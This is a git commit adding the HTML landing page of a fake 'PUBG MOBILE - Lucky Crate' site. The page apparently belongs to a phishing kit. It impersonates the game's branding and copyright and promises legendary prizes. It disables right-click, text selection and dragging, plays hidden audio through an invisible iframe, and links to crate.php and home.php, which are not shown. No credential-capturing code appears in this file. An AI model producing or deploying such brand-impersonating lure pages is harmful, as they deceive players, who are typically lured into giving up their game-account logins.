a0ba149b41989576521a5309bcbc9805fd6c7996
julak1985 <67923293+julak1985@users.noreply.github.com>
2020-07-07 02:23:30 +0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,38 @@
+<html>
+<head>
+    
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="PUBG MOBILE - Lucky Crate">
+<meta name="description" content="The last week of the season is over. Come join the Royale Pass 13 season finale here. Get a variety of legendary prizes and more!">
+<meta property="og:description" content="The last week of the season is over. Come join the Royale Pass 13 season finale here. Get a variety of legendary prizes and more!">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="PUBG MOBILE - Lucky Crate">
+<meta property="og:type" content="website">
+<meta name="copyright"content="PUBG MOBILE">
+<meta name="theme-color" content="#f2aa00">
+<meta property="og:image" content="https://i.ibb.co/3CSfdjd/season.png">
+<title>PUBG MOBILE - Lucky Crate</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<link rel="icon" href="img/icon.png">
+</head>
+<iframe scrolling="no" allow="autoplay" src="Alan Walker - On My Way.mp3" width="0" height="0" frameborder="no"></iframe>
+
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+<iframe scrolling="no" allow="autoplay" src="" width="0" height="0" frameborder="no"></iframe>  
+<div class="my-container poster">
+<div class="txt-crate-name">
+Lucky Crate
+<br>
+<span>Open for a chance to be surprised</span>
+</div>
+
+<i class="fa fa-eye fa-2x crate-eye" onclick="location.href='home.php';"></i>
+<div class="content-poster"></div>
+<button type="button" class="btn-open-crate" onclick="location.href='crate.php';">Open Lucky Crate</button>
+</div> <!--- container --->
+
+</html>
